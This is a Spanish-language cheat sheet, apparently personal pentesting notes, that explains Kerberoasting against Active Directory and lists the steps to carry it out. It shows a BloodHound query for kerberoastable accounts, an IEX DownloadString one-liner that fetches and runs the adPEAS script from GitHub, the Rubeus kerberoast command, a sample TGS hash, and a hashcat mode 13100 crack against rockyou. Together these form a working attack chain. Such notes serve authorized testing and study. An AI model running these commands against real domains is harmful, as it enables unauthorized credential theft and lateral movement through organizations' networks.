# Kerberoasting 

Tags: #AD #Kerberoasting #Rubeus  #BloodHound #ADPeas  #HashCat #Powershell #Windows 

El "Kerberoasting" es una técnica utilizada por atacantes para extraer tickets de servicio de Kerberos en Active Directory y descifrarlos fuera de línea, con el objetivo de obtener contraseñas en texto claro de cuentas de servicio. Este ataque aprovecha configuraciones débiles, como contraseñas poco seguras en cuentas de servicio, y representa una vulnerabilidad significativa en entornos de AD, dado que no genera alertas inmediatas al realizarse el descifrado fuera de la red.

```bash 
# Funcionamiento 

1. Ticket de Servicio: En Kerberos, cuando un usuario quiere acceder a un servicio, solicita un ticket de servicio (TGS, Ticket Granting Service). Este ticket está cifrado con la contraseña de la cuenta de servicio del recurso al que el usuario quiere acceder.
    
2. Extracción: Un atacante no necesita privilegios especiales en el dominio para solicitar un ticket de servicio para cualquier cuenta de servicio. Una vez que el atacante tiene el ticket, puede exportarlo y llevarlo a otro lugar para intentar descifrarlo.
    
3. Descifrado: El atacante intentará descifrar el ticket fuera de línea utilizando herramientas de fuerza bruta o diccionarios. Si la contraseña de la cuenta de servicio es débil, el atacante podría descifrarla en un tiempo razonable.
    
4. Compromiso: Una vez que el atacante tiene la contraseña en texto claro de la cuenta de servicio, puede usarla para acceder a recursos o moverse lateralmente en la red.
```

## Detectar con BloodHound

```bash 
Para detectar posibles vectores de ataque relacionados al Kerberoasting en BloodHound simplemente ejecutamos la siguiente consulta:

	* 'List all Kerberoastable Accounts' en la pestaña de 'Analisys'
```

## Obtener Hash con ADPeas

```bash 
# Ejemplo de un hash 'Kerberoasteable'
❯ $krb5tgs$23$*roast.user$domain1.corp$MSSQL/sql.domain1.corp*$A8DDCBEA1C6AEFE971C4BA672CBC9F32$8D3...

Nota: 
	1. Guardar el Hash en una sola linea en un documento .txt
```

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada
```

##  Rubeus

```bash 
1. Solicitar Tickets Kerberos (TGTs): Rubeus puede solicitar Ticket Granting Tickets (TGTs) utilizando contraseñas, hashes o incluso claves.
    
2. Kerberoasting: Rubeus es capaz de solicitar Ticket Granting Service (TGS) tickets para cuentas de servicio y luego intentar descifrar estos tickets fuera de línea para obtener contraseñas en texto claro, una técnica conocida como Kerberoasting.
    
3. Overpass (Pass-the-Ticket): Rubeus puede realizar ataques de "Overpass", donde los TGTs son utilizados para autenticarse en otros sistemas sin conocer la contraseña del usuario.
    
4. Ticket Renewal: Puede renovar tickets válidos que aún estén dentro de su período de renovación.
    
5. Dumping Tickets: Rubeus puede extraer tickets de la memoria y almacenarlos para su uso o análisis posterior.
    
6. Manipulación de Tickets: Puede purgar, renovar e incluso falsificar tickets de Kerberos.
    
7. Hunting de Tickets: Rubeus puede buscar en la red tickets específicos que proporcionen acceso a ciertos recursos o que posean ciertos privilegios.
    
8. Ataques de Fuerza Bruta: Puede intentar fuerza bruta contra cuentas de usuario con el objetivo de obtener un TGT.
```

* [Rubeus](https://github.com/GhostPack/Rubeus)

```bash 
❯ ./Rubeus.exe kerberoast        # Obtener el hash de un usuario kerberosteable 

Nota:
	1. Guardar el Hash en una sola linea en un documento .txt
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 13100 hash-kerberoasting /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 13100 = TGS de un Kerberoasting
	# hash-kerberoasting = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```